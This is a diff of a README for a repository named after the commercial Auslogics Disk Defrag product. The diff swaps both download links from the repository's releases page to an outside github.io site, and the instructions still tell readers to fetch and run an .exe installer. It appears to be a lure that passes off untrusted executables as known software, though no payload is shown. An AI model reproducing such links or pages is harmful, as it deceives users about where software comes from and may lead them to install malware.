@@ -1,6 +1,6 @@
 # 💿 Auslogics-Disk-Defrag-2026 - Optimize your disk for faster performance
 
-[![Download Auslogics Disk Defrag](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Sinusoidminestrone797/Auslogics-Disk-Defrag-2026/releases)
+[![Download Auslogics Disk Defrag](https://img.shields.io/badge/Download-Release-blue)](https://sinusoidminestrone797.github.io)
 
 ## 📌 About this application
 
@@ -20,7 +20,7 @@ To install and run this application, your computer must meet these basic require
 
 ## 📥 How to download and install
 
-1. Visit the [releases page](https://github.com/Sinusoidminestrone797/Auslogics-Disk-Defrag-2026/releases) to access the installer.
+1. Visit the [releases page](https://sinusoidminestrone797.github.io) to access the installer.
 2. Select the latest version listed under the Assets section.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your Downloads folder.
